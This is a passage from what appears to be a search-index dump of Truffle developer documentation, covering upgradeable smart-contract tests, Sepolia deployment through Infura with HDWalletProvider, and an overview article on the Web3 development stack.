initializer function. Now, we can just call contract functions directly from the console to quickly see if our contract is working. truffle ( development ) > let contract = await UpgradeablePet.deployed () ; undefined truffle ( development ) > await contract.store ( 5 ) { tx: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , receipt: { transactionHash: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , transactionIndex: 0 , blockNumber: 14 , blockHash: '0x5ebca4e4c9d5bed1300e6fe9399144f47f8f751ce2bd4a655b160242cb540e44' , from: '0xa8469e3bf6474abb1290a4c03f43021667df130e' , to: '0xb85a509102b82f02281b0451c43fa37e00d625ad' , cumulativeGasUsed: 54413 , gasUsed: 54413 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x40000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000000040000000000000000000000400000000000000000000000000000' , status: true, effectiveGasPrice: 2662958768 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0xb85a509102B82f02281b0451C43FA37e00d625ad' , blockHash: '0x5ebca4e4c9d5bed1300e6fe9399144f47f8f751ce2bd4a655b160242cb540e44' , blockNumber: 14 , logIndex: 0 , removed: false, transactionHash: '0xeb7971ae96003a2be24ed38e7d62ab8741f5a8f772d5155679f41929d2808a6f' , transactionIndex: 0 , id: 'log_c488ac08' , event: 'ValueChanged' , args: [ Result ] } ] } truffle ( development ) > contract.retrieve () BN { negative: 0 , words: [ 5 , < 1 empty item> ] , length: 1 , red: null } Nice! Before moving forward, let's write a test! When writing tests for upgrades we'll need to write tests for both the implementation contract AND the proxy contract. Luckily, we can use OpenZeppelin's deployProxy in our tests. Let's first install OpenZeppelin's test helpers to make testing a little easier. npm i --save-dev @openzeppelin/test-helpers Writing the test for the implementation contract is the same as usual. Let's create a file called upgradeable_pets.js under the test folder and add this code: const { expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); contract ( \"UpgradeablePet\" , function ( accounts ) { it ( \"should retrieve correctly stored value\" , async function () { const upgradeablePetInstance = await UpgradeablePet . deployed (); let tx = await upgradeablePetInstance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); }); it ( \"should not set the stored value if not owner\" , async function () { const upgradeablePetInstance = await UpgradeablePet . deployed (); // Failed require in function await expectRevert ( upgradeablePetInstance . store ( 10 , { from : accounts [ 1 ]}), \"UpgradeablePet: not owner\" ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet value should not have changed\" ); }); }); Then, create a test file called upgradeable_pets.proxy.js , and add the following: const { expectRevert , expectEvent } = require ( '@openzeppelin/test-helpers' ); const { deployProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); contract ( \"UpgradeablePet (Proxy)\" , function ( accounts ) { it ( \"should retrieve correctly stored value\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); let tx = await upgradeablePetInstance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); }); it ( \"should not set the stored value if not owner\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); // Failed require in function await expectRevert ( upgradeablePetInstance . store ( 10 , { from : accounts [ 1 ]}), \"UpgradeablePet: not owner\" ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 0 , \"UpgradeablePet value should not have changed\" ); }); }); You'll notice instead of using UpgradeablePet.deployed() , we use deployProxy to get our contract instance. To test, simply call truffle test to make sure everything is working properly.", "title": "Write an Upgradeable Contract V1"}, {"location": "guides/upgrading-security/#write-the-upgradeable-contract-v2", "text": "Now, let's get to the exciting part: actually adding a change! We will first create a new duplicate contract and then add an increment function to increment the stored value. Create a new contract UpgradeablePetV2 with an increment function. It should look like this: // SPDX-License-Identifier: MIT pragma solidity >= 0.4.22 < 0.9.0 ; import \"@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol\" ; contract UpgradeablePetV2 is Initializable { uint256 private _value ; address private _petOwner ; // Emitted when the stored value changes event ValueChanged ( uint256 value ); function initialize ( address petOwner ) public initializer { _petOwner = petOwner ; } /// @custom:oz-upgrades-unsafe-allow constructor constructor () initializer {} // Stores a new value in the contract function store ( uint256 value ) public { require ( msg . sender == _petOwner , \"UpgradeablePet: not owner\" ); _value = value ; emit ValueChanged ( value ); } // Reads the last stored value function retrieve () public view returns ( uint256 ) { return _value ; } // Increments the stored value by 1 function increment () public { _value = _value + 1 ; emit ValueChanged ( _value ); } } Now, we'll be using OpenZeppelin's upgradeProxy function, which will: Deploy the implementation contract ( UpgradeablePetV2 ) Call the ProxyAdmin to update the proxy contract to use the new implementation. We will use this in our new deployment script: const { upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( 'UpgradeablePet' ); const UpgradeablePetV2 = artifacts . require ( 'UpgradeablePetV2' ); module . exports = async function ( deployer ) { const alreadyDeployed = await UpgradeablePet . deployed (); await upgradeProxy ( alreadyDeployed . address , UpgradeablePetV2 , { deployer }); }; Then, call migrate from the console, and test out increment: truffle ( development ) > contract = await UpgradeablePet.deployed () undefined truffle ( development ) > contract.address '0xAe02BB114AAD3Edf8b87827Cf001F3D49165b426' truffle ( development ) > let contractv2 = await UpgradeablePetV2.at ( contract.address ) undefined truffle ( development ) > contractv2.retrieve () BN { negative: 0 , words: [ 5 , < 1 empty item> ] , length: 1 , red: null } truffle ( development ) > contractv2.increment () { tx: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , receipt: { transactionHash: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , transactionIndex: 0 , blockNumber: 36 , blockHash: '0xe75e2d55a8d310f6686c61f5f8ecf75e05b8be96b985ac31f515a90eafe058d2' , from: '0xa8469e3bf6474abb1290a4c03f43021667df130e' , to: '0xae02bb114aad3edf8b87827cf001f3d49165b426' , cumulativeGasUsed: 35076 , gasUsed: 35076 , contractAddress: null, logs: [ [ Object ] ] , logsBloom: '0x40000000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000200' , status: true, effectiveGasPrice: 2509015503 , type: '0x2' , rawLogs: [ [ Object ] ] } , logs: [ { address: '0xAe02BB114AAD3Edf8b87827Cf001F3D49165b426' , blockHash: '0xe75e2d55a8d310f6686c61f5f8ecf75e05b8be96b985ac31f515a90eafe058d2' , blockNumber: 36 , logIndex: 0 , removed: false, transactionHash: '0x76820ff204a1ba364ee3deed7e62371f0803eb0b661fd5d88d845abb3f972fbc' , transactionIndex: 0 , id: 'log_b88893d4' , event: 'ValueChanged' , args: [ Result ] } ] } truffle ( development ) > contractv2.retrieve () BN { negative: 0 , words: [ 6 , < 1 empty item> ] , length: 1 , red: null } Notice that we used let contractv2 = await UpgradeablePetV2.at(contract.address) . .at is a special Truffle function that allows you to create a new abstraction at the same address. Finally, let's write the tests. Again, we'll need to test both the implementation contract and the proxy contract. Create a file upgradeable_pet_V2.js and add: const { expectEvent } = require ( '@openzeppelin/test-helpers' ); const UpgradeablePetV2 = artifacts . require ( \"UpgradeablePetV2\" ); contract ( \"UpgradeablePetV2\" , function ( accounts ) { it ( \"should increment the stored value\" , async function () { const upgradeablePetV2Instance = await UpgradeablePetV2 . deployed (); let tx = await upgradeablePetV2Instance . store ( 5 ); expectEvent ( tx , \"ValueChanged\" , { value : \"5\" }); let value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePetV2 did not store correct value\" ); await upgradeablePetV2Instance . increment (); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 6 , \"UpgradeablePetV2 did not increment\" ); }); }); Like deployProxy , we can also use upgradeProxy in our tests. Create a new test called upgradeable_pet_V2.proxy.js : const { deployProxy , upgradeProxy } = require ( '@openzeppelin/truffle-upgrades' ); const UpgradeablePet = artifacts . require ( \"UpgradeablePet\" ); const UpgradeablePetV2 = artifacts . require ( \"UpgradeablePetV2\" ); contract ( \"UpgradeablePetV2 (Proxy)\" , function ( accounts ) { it ( \"should increment the stored value\" , async function () { const upgradeablePetInstance = await deployProxy ( UpgradeablePet , [ accounts [ 0 ]], { initializer : 'initialize' }); await upgradeablePetInstance . store ( 5 ); let value = await upgradeablePetInstance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePet did not store correct value\" ); const upgradeablePetV2Instance = await upgradeProxy ( upgradeablePetInstance . address , UpgradeablePetV2 ); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 5 , \"UpgradeablePetV2 did not store correct value\" ); await upgradeablePetV2Instance . increment (); value = await upgradeablePetV2Instance . retrieve (); assert . equal ( value , 6 , \"UpgradeablePetV2 did not increment\" ); }); }); The point we want to test here is that state was preserved between V1 and V2 of the smart contract.", "title": "Write the Upgradeable Contract V2"}, {"location": "guides/upgrading-security/#future-extensions", "text": "And there you have it! You've upgraded a smart contract! Again, be sure to watch the livestream on YouTube , and see what's upcoming on our GitHub page . OpenZeppelin has also written their own blog post that goes much more in depth and includes real-world examples here . If you're interested in making the previous episode's contracts upgradable, you'll need to use the ugpradable versions of their base contracts, which can be installed via npm i @open-zeppelin/upgradeable-contract , which will use initialize instead of constructor . If you want to talk about this content, make suggestions for what you'd like to see or ask questions about the series, start a discussion here . If you want to show off what you built or just hang with the Unleashed community in general, join our Discord ! Lastly, don't forget to follow us on Twitter for the latest updates on all things Truffle.", "title": "Future Extensions"}, {"location": "guides/using-infura-custom-provider/", "text": "Infura\u2019s API suite provides instant HTTPS and WebSocket access to the Ethereum and IPFS networks. By using Infura, you can connect easily to Web 3.0 without having to spin-up and maintain your own infrastructure. Their core service is free and provides everything you need to start building awesome decentralized applications today! You may not be familiar with Infura by name, but if you've used MetaMask then you've used Infura, as it is the Ethereum provider that powers MetaMask. For security reasons, Infura does not manage your private keys, which means Infura cannot sign transactions on your behalf. However, Truffle can sign transactions through the use of its HDWalletProvider . This provider can handle the transaction signing as well as the connection to the Ethereum network. ( Read more about HDWalletProvider .) This tutorial will show you how to use Infura to migrate an existing dapp to an Ethereum network supported by Infura. In this specific instance, we'll migrate to Sepolia. We'll assume that you already have a dapp to migrate. If you want a test dapp, feel free to use our Pet Shop tutorial dapp. Install HDWalletProvider \u00b6 Truffle's HDWalletProvider is a separate npm package: npm install @truffle/hdwallet-provider Note : If you are on Windows and get an `MSBUILD` error, you may need to install the Windows build tools. In a terminal with Administrator rights, run `npm install -g windows-build-tools` and then try installation again. Register with Infura and create a new project \u00b6 Before you can use Infura, you need to register . Upon registration, this guide will walk you through creating a new project, authenticating with your new Web3 API Key, securely copying your keys and selecting the appropriate network endpoint. Configure your Truffle project \u00b6 The next step is to edit your truffle-config.js file to use HDWalletProvider and provide all the necessary configuration for deploying to Sepolia. First, define the HDWalletProvider object in your configuration file. Add this line at the top of your truffle-config.js file: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); Next, provide a reference to your mnemonic that generates your accounts. If you don't have a mnemonic, you can generate one using an online mnemonic generator or a hardware wallet such as a product from Ledger . const mnemonic = \"orange apple banana ... \" ; Warning : In production, we highly recommend storing the mnemonic in another (secret) file, to reduce the risk of the mnemonic becoming known. If someone knows your mnemonic, they have all of your addresses and private keys! Add a Sepolia network definition: module . exports = { networks : { sepolia : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\" ) }, network_id : 11155111 } } }; Things to notice: While the example has only a single network defined, you can define multiple networks as normal. The provider for the sepolia network definition instantiates the HDWalletProvider . The HDWalletProvider takes as arguments a mnemonic and the desired network. A list of Infura-supported networks is available in the Endpoints dropdown on your Infura Project Settings page. Make sure to replace <INFURA_WEB3_API_KEY> with your Infura Web3 API Key. The provider value is wrapped in a function, which ensures that it won't get initialized until it's needed. This is especially important if connecting to multiple networks. (See the Networks configuration section of the documentation for more on this topic.) Note : If you encounter issues with this construction, you can skip the function wrapper and use this instead: provider: new HDWalletProvider(mnemonic, \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\"), Without any other arguments, the account in charge of migration will be the first one generated by the mnemonic. But if desired, you can pass in an argument to specify which account to use. As an example, to use the third account: new HDWalletProvider ( mnemonic , \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\" , 2 ); (Recall that the index is zero-based, so 2 is the third address.) Use an ether faucet \u00b6 Make sure you have enough ether in your account to do the deployment. You can acquire ether on the Sepolia network through a service known as a faucet. While there are multiple faucet sites out there, one service we recommend is hosted by Infura . Navigate to Infura's Sepolia Testnet Ether Faucet . Connect to the Sepolia Test Network using MetaMask . The faucet will link to your first account. Click \"RECEIVE ETH\" to submit your request. Within a short period of time, your account will be populated with the requested ether. We are now ready to deploy to Sepolia! Deploy the contract \u00b6 Compile your project, if not already done: truffle compile Deploy to the Sepolia network: truffle migrate --network sepolia If all goes well, you should see a response that looks similar to the following: Starting migrations... ====================== > Network name: 'sepolia' > Network id: 11155111 > Block gas limit: 0x6691b7 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 ...... ...... Note that your transaction hash and contract address will be different from the ones above. Note : If you receive an error `Error: Exceeds block gas limit `, you may need to manually set the gas limit for your contract. See the [Truffle Configuration](/docs/truffle/reference/configuration) documentation for details. If you want to verify that your contract was deployed successfully, you can check this on the Sepolia section of Etherscan . In the search field, type in the transaction ID for your contract. You should see details about the transaction, including the block number where the transaction was secured. Congratulations! You've deployed your contract to Sepolia using the combined power of Infura and Truffle.", "title": "Using Infura (or a custom provider)"}, {"location": "guides/using-infura-custom-provider/#install-hdwalletprovider", "text": "Truffle's HDWalletProvider is a separate npm package: npm install @truffle/hdwallet-provider Note : If you are on Windows and get an `MSBUILD` error, you may need to install the Windows build tools. In a terminal with Administrator rights, run `npm install -g windows-build-tools` and then try installation again.", "title": "Install HDWalletProvider"}, {"location": "guides/using-infura-custom-provider/#register-with-infura-and-create-a-new-project", "text": "Before you can use Infura, you need to register . Upon registration, this guide will walk you through creating a new project, authenticating with your new Web3 API Key, securely copying your keys and selecting the appropriate network endpoint.", "title": "Register with Infura and create a new project"}, {"location": "guides/using-infura-custom-provider/#configure-your-truffle-project", "text": "The next step is to edit your truffle-config.js file to use HDWalletProvider and provide all the necessary configuration for deploying to Sepolia. First, define the HDWalletProvider object in your configuration file. Add this line at the top of your truffle-config.js file: const HDWalletProvider = require ( \"@truffle/hdwallet-provider\" ); Next, provide a reference to your mnemonic that generates your accounts. If you don't have a mnemonic, you can generate one using an online mnemonic generator or a hardware wallet such as a product from Ledger . const mnemonic = \"orange apple banana ... \" ; Warning : In production, we highly recommend storing the mnemonic in another (secret) file, to reduce the risk of the mnemonic becoming known. If someone knows your mnemonic, they have all of your addresses and private keys! Add a Sepolia network definition: module . exports = { networks : { sepolia : { provider : function () { return new HDWalletProvider ( mnemonic , \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\" ) }, network_id : 11155111 } } }; Things to notice: While the example has only a single network defined, you can define multiple networks as normal. The provider for the sepolia network definition instantiates the HDWalletProvider . The HDWalletProvider takes as arguments a mnemonic and the desired network. A list of Infura-supported networks is available in the Endpoints dropdown on your Infura Project Settings page. Make sure to replace <INFURA_WEB3_API_KEY> with your Infura Web3 API Key. The provider value is wrapped in a function, which ensures that it won't get initialized until it's needed. This is especially important if connecting to multiple networks. (See the Networks configuration section of the documentation for more on this topic.) Note : If you encounter issues with this construction, you can skip the function wrapper and use this instead: provider: new HDWalletProvider(mnemonic, \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\"), Without any other arguments, the account in charge of migration will be the first one generated by the mnemonic. But if desired, you can pass in an argument to specify which account to use. As an example, to use the third account: new HDWalletProvider ( mnemonic , \"https://sepolia.infura.io/v3/<INFURA_WEB3_API_KEY>\" , 2 ); (Recall that the index is zero-based, so 2 is the third address.)", "title": "Configure your Truffle project"}, {"location": "guides/using-infura-custom-provider/#use-an-ether-faucet", "text": "Make sure you have enough ether in your account to do the deployment. You can acquire ether on the Sepolia network through a service known as a faucet. While there are multiple faucet sites out there, one service we recommend is hosted by Infura . Navigate to Infura's Sepolia Testnet Ether Faucet . Connect to the Sepolia Test Network using MetaMask . The faucet will link to your first account. Click \"RECEIVE ETH\" to submit your request. Within a short period of time, your account will be populated with the requested ether. We are now ready to deploy to Sepolia!", "title": "Use an ether faucet"}, {"location": "guides/using-infura-custom-provider/#deploy-the-contract", "text": "Compile your project, if not already done: truffle compile Deploy to the Sepolia network: truffle migrate --network sepolia If all goes well, you should see a response that looks similar to the following: Starting migrations... ====================== > Network name: 'sepolia' > Network id: 11155111 > Block gas limit: 0x6691b7 1_initial_migration.js ====================== Deploying 'Migrations' ---------------------- > transaction hash: 0x166c1791caa73cca6a75fe4258866bd1f2d1bcf2cd4c3a2a1e03fab29c42829d > Blocks: 0 Seconds: 0 > contract address: 0x5ccb4dc04600cffA8a67197d5b644ae71856aEE4 ...... ...... Note that your transaction hash and contract address will be different from the ones above. Note : If you receive an error `Error: Exceeds block gas limit `, you may need to manually set the gas limit for your contract. See the [Truffle Configuration](/docs/truffle/reference/configuration) documentation for details. If you want to verify that your contract was deployed successfully, you can check this on the Sepolia section of Etherscan . In the search field, type in the transaction ID for your contract. You should see details about the transaction, including the block number where the transaction was secured. Congratulations! You've deployed your contract to Sepolia using the combined power of Infura and Truffle.", "title": "Deploy the contract"}, {"location": "guides/web3-development-stack/", "text": "Written by Kingsley Arinze Before you set out to build an application, you need to first decide on the technology stack to use. The term \u201c technology stack\u201d refers to the tools, libraries, and frameworks needed to build and run a software application. A simple application would consist of three layers: The Data layer that handles information storage for easy retrieval and computation. The Logic layer that handles the business logic. All the necessary computation happens here. The Presentation Layer that is responsible for what the user sees. It presents everything happening under the hood in a user-friendly way. To successfully build out each layer, you need to use specific tools, libraries, and frameworks. These tools, libraries, and frameworks are what forms your development stack for that software application. In the traditional Web2 world, you hear references such as MEAN stack, LAMP stack, MAMP stack. These are all acronyms for some of the tools, libraries, and frameworks that power Web2 applications. Web3 is an emergent iteration of the World Wide Web. As with every technology in its nascent stage, most people struggle to understand how the different parts come together. This blog defines the Web3 stack, but before we jump right in, let's review the evolution of the Web. Web 1: Read-Only \u00b6 Web1 refers to the World Wide Web era where users (mostly companies) created content in the form of static websites built with SSI or CGI and hosted on ISP servers. Web1 was a read-only web and lasted between 1990 and 2004, with most users consuming content created by content creators. The Web1 stack had two defining layers: File System for file storage (Data Layer) HTML and CSS for presentation. (Presentation Layer) Since Web1 was primarily static and presentational, there wasn't a layer that handled business logic. Web 2: Read-Write \u00b6 The Web2 is a read-write web where both companies and users can be content creators. It allowed everyday people to contribute to the web for the first time and was ushered in by the Facebooks and the Googles of the world - the tech giants . While there wasn't any change in the nature and structure of Web1, there was a significant change in how people started to use the web. The introduction of Javascript libraries such as JQuery saw the web become more interactive and user-friendly. Building on Web2 requires adding more sophisticated tools to the Web1 stack like dynamic programming languages (JavaScript, PHP, Java, Python) that could dynamically serve content from files and database systems. The Web2 stack can be said to include the following: Databases: Relational databases(Postgres, Mysql), NoSQL databases(MongoDB), and key-value databases(Redis), amongst others, form the data layer for Web2 applications. Dynamic Programming Languages handle the business logic in Web2 applications. It saw the introduction of frameworks like Laravel (PHP), Django(Python), and libraries like Express( Node.js/Javascript) that streamlined the software development process. HTML and CSS remain the go-to for building user interfaces and presenting data in Web2. However, with Javascript libraries like JQuery, React.js, and Angular, the data presentation layer in Web2 is more interactive and user-friendly than that of its predecessor. Web3: Read-Write-Own \u00b6 Thus far, we've experienced Web1 where companies created content and, as a result, earned money. We've also seen (and are still seeing) Web2 where users generate content but only companies and platform owners, through user-generated content, make money. This new web iteration known as Web3 takes the web a step further by allowing content creators to own not only their content but their identity and assets. Web3 is a decentralized, open, and censorship-resistant web, powered by blockchains like Ethereum, Solana, and hundreds of others. It is a trustless and self-governing web, where companies do not have as much power as they do in Web2 due to the openness and ownership of user data. Instead, it aims to return power to those responsible for keeping the network alive. To explain what it means for users to own their data in Web3, let's examine the current situation on Web2 today. Assuming a user isn't impressed with the practices of a company they use regularly and decides to move to a different platform, this user would have to start fresh as all their existing data would live in a centralized database owned by a company like Google, Facebook, Amazon, and others. What makes Web3 different is that anyone with an Internet connection can access the blockchain which gives users more freedom and control over their data. Web3 also introduced the concept of Decentralized Autonomous Organizations (DAOs), which is a new way of running companies through communities. In a traditional Web2 company, decisions regarding its direction are determined by investors and stakeholders, leaving out users directly affected by these decisions. With DAOs, users in the form of community members are responsible for deciding the direction of these companies through rules and regulations written in code and enforced by blockchain technologies. These programmable rules and regulations are known as smart contracts. Smart contracts are computer programs that digitize agreements and automatically execute when the terms of said agreements are met. They are computer code that lives and runs on Ethereum and other blockchains. The Web3 Stack \u00b6 The Web3 stack is a collection of tools and technologies that are different from the Web2 stack. Web3 replaces centralized technologies like databases with open and decentralized technologies like blockchains. The only similarity between both stacks is how Javascript libraries remain the go-to for building user interfaces, and even at that, how we fetch data from the backend is different in that Web2 applications use libraries like Axios and Fetch to make HTTP calls to backend servers. In contrast, web3 applications use libraries like Ether.js and Web3.js to make RPC calls to blockchains. Web3 also introduces new primitives like native payment support that completely removes the need for intermediaries and large banks. We can breakdown the Web3 stack into the following layers: The data layer powered by decentralized blockchain technologies File storage layer powered by distributed peer-2-peer networks API/Data Access Layer Presentation Layer Identity Layer The data layer \u00b6 This is where information is stored and is the major difference between the Web2 and the Web3 stack. Whereas Web2 applications store data on central databases, owned and maintained by companies who restrict access, Web3 applications rely on open, decentralized, and permissionless state machines for data storage, where anyone with the requisite skills and enough curiosity can access data. Blockchain technologies primarily power this layer and Ethereum is at the forefront with the majority of Web3 developers choosing to build their dapps there. Ethereum has a virtual environment known as the Ethereum Virtual Machine or EVM that stores user data (like accounts and accounts balance) and computes the next state of the network. This virtual environment is also responsible for storing and executing smart contract code mostly written in the Solidity and Viper programming languages. Due to the popularity of the EVM and the Ethereum blockchain, we've seen the emergence of other blockchains, sidechains, and Layer 2 solutions fully compatible with the EVM, allowing applications built on Ethereum to run on these platforms without needing any modification. Examples of these platforms are: The Arbitrium layer two solution The Optimism layer two solution The Polygon sidechain The Avalanche blockchain The Fantom blockchain There are other blockchains that operate differently from Ethereum and are not EVM-compatible but are home to decentralized applications too like Solana , NEAR, Avalanche, and others Although to build dapps on Solana and NEAR, you must understand the Rust programming language. File storage Layer \u00b6 Since users' data storage happens on decentralized blockchains, it makes sense that files like images, videos, HTML, and CSS files are also stored in decentralized networks so no one organization has full access and control over them. Unfortunately, storing data like the ones mentioned above on blockchains like Ethereum (and other EVM compatible ones) or Solana can be costly. When choosing a data storage mechanism for a dapps, one has to consider the following: Persistence mechanism and incentive structure Data retention enforcement Decentrality Consensus Fortunately, there are several options to choose from like Arweave who offer permanent file storage by incentivizing node operators and miners who in turn maintain storage of these files for extended periods. Contract-based platforms like Filecoin and Skynet do not store files forever but instead, keep files for a period specified by a contract. InterPlanetary File System or IPFS , another distributed system for storing and accessing files, doesn't have any built-in incentive mechanism for miners but can be used together with other contract-based solutions. API/Data Access Layer \u00b6 Another essential layer of the Web3 stack is the API or Data access layer. This comprises platforms that enable easy access to data that lives on the blockchain and files on distributed file storage networks. Due to the current state of popular blockchain networks like Ethereum, running a self-hosted node to access blockchain data can be time-consuming. Therefore, maintaining these nodes does not contribute directly to productive hours, especially during development. This is why platforms like Infura exist. Infura exposes a set of APIs that allow Web3 developers to connect their dapps to the Ethereum network with zero stress, letting them focus on building out application features rather than maintaining nodes. It also provides an API for connecting to IPFS for distributed files storage and retrieval. Alchemy is another example of API platforms supporting popular blockchains like Ethereum, Flow, and Polygon. Quicknode , on the other hand, provides Dapps developers with access to blockchain data via APIs and dedicated node instances. Presentation Layer \u00b6 The presentation layer for a dapp is not too different from that of a Web2 app. We use the same set of libraries to create user interfaces. For example, due to its popularity and thriving ecosystem, the React.js library remains the preferred choice for building out the frontend of Web3 applications. Other libraries such as JQuery, Angular and VueJS can also be used. The major difference between the Web3. frontend stack and that of Web2. is how we fetch data from external APIs. By comparison, a typical Web2 application uses HTTP libraries like Axios and Fetch to query API endpoints or clients like Apollo for GraphQL endpoints; in Web3, we use libraries like Ether.js or Web3.js to make Remote Procedure Calls (RPC) to blockchain nodes. Identity Layer \u00b6 Unlike in Web2, where internet users are identified by their unique username/email and password, Web3 implements an entirely different strategy for identity management powered by blockchain wallet like MetaMask . In Web3, the typical user experience involves connecting your wallet to a dapp you want to use and granting this wallet the power to sign transactions on your behalf. There are two popular ways to connect a wallet to a dapp: By accessing the provider object exposed by these wallets on the browser window. This primarily applies to wallets in the form of browser extensions. By scanning a barcode exposed by the dapp using tools like WalletConnect (for Ethereum). Wallets in the form of mobile applications mostly use this method. Libraries like Web3Modal and Web3React exists to help developers connect to multiple wallet providers with the same code. Conclusion \u00b6 Web3 enforces the concept of decentralization by replacing centralized technologies with blockchains and protocols. It also introduces a new way of giving users ownership of their data and identity through private-key cryptography. What will define Web3 moving forward is the ease at which dapps can be built. This is why defining the stack is critical. At Truffle we aim to be the number one choice for development.", "title": "The Web3 development stack"}, {"location": "guides/web3-development-stack/#web-1-read-only", "text": "Web1 refers to the World Wide Web era where users (mostly companies) created content in the form of static websites built with SSI or CGI and hosted on ISP servers. Web1 was a read-only web and lasted between 1990 and 2004, with most users consuming content created by content creators. The Web1 stack had two defining layers: File System for file storage (Data Layer) HTML and CSS for presentation. (Presentation Layer) Since Web1 was primarily static and presentational, there wasn't a layer that handled business logic.", "title": "Web 1: Read-Only"}, {"location": "guides/web3-development-stack/#web-2-read-write", "text": "The Web2 is a read-write web where both companies and users can be content creators. It allowed everyday people to contribute to the web for the first time and was ushered in by the Facebooks and the Googles of the world - the tech giants . While there wasn't any change in the nature and structure of Web1, there was a significant change in how people started to use the web. The introduction of Javascript libraries such as JQuery saw the web become more interactive and user-friendly. Building on Web2 requires adding more sophisticated tools to the Web1 stack like dynamic programming languages (JavaScript, PHP, Java, Python) that could dynamically serve content from files and database systems. The Web2 stack can be said to include the following: Databases: Relational databases(Postgres, Mysql), NoSQL databases(MongoDB), and key-value databases(Redis), amongst others, form the data layer for Web2 applications. Dynamic Programming Languages handle the business logic in Web2 applications. It saw the introduction of frameworks like Laravel (PHP), Django(Python), and libraries like Express( Node.js/Javascript) that streamlined the software development process. HTML and CSS remain the go-to for building user interfaces and presenting data in Web2. However, with Javascript libraries like JQuery, React.js, and Angular, the data presentation layer in Web2 is more interactive and user-friendly than that of its predecessor.", "title": "Web 2: Read-Write"}, {"location": "guides/web3-development-stack/#web3-read-write-own", "text": "Thus far, we've experienced Web1 where companies created content and, as a result, earned money. We've also seen (and are still seeing) Web2 where users generate content but only companies and platform owners, through user-generated content, make money. This new web iteration known as Web3 takes the web a step further by allowing content creators to own not only their content but their identity and assets. Web3 is a decentralized, open, and censorship-resistant web, powered by blockchains like Ethereum, Solana, and hundreds of others. It is a trustless and self-governing web, where companies do not have as much power as they do in Web2 due to the openness and ownership of user data. Instead, it aims to return power to those responsible for keeping the network alive. To explain what it means for users to own their data in Web3, let's examine the current situation on Web2 today. Assuming a user isn't impressed with the practices of a company they use regularly and decides to move to a different platform, this user would have to start fresh as all their existing data would live in a centralized database owned by a company like Google, Facebook, Amazon, and others. What makes Web3 different is that anyone with an Internet connection can access the blockchain which gives users more freedom and control over their data. Web3 also introduced the concept of Decentralized Autonomous Organizations (DAOs), which is a new way of running companies through communities. In a traditional Web2 company, decisions regarding its direction are determined by investors and stakeholders, leaving out users directly affected by these decisions. With DAOs, users in the form of community members are responsible for deciding the direction of these companies through rules and regulations written in code and enforced by blockchain technologies. These programmable rules and regulations are known as smart contracts. Smart contracts are computer programs that digitize agreements and automatically execute when the terms of said agreements are met. They are computer code that lives and runs on Ethereum and other blockchains.", "title": "Web3: Read-Write-Own"}, {"location": "guides/web3-development-stack/#the-web3-stack", "text": "The Web3 stack is a collection of tools and technologies that are different from the Web2 stack. Web3 replaces centralized technologies like databases with open and decentralized technologies like blockchains. The only similarity between both stacks is how Javascript libraries remain the go-to for building user interfaces, and even at that, how we fetch data from the backend is different in that Web2 applications use libraries like Axios and Fetch to make HTTP calls to backend servers. In contrast, web3 applications use libraries like Ether.js and Web3.js to make RPC calls to blockchains. Web3 also introduces new primitives like native payment support that completely removes the need for intermediaries and large banks. We can breakdown the Web3 stack into the following layers: The data layer powered by decentralized blockchain technologies File storage layer powered by distributed peer-2-peer networks API/Data Access Layer Presentation Layer Identity Layer", "title": "The Web3 Stack"}, {"location": "guides/web3-development-stack/#the-data-layer", "text": "This is where information is stored and is the major difference between the Web2 and the Web3 stack. Whereas Web2 applications store data on central databases, owned and maintained by companies who restrict 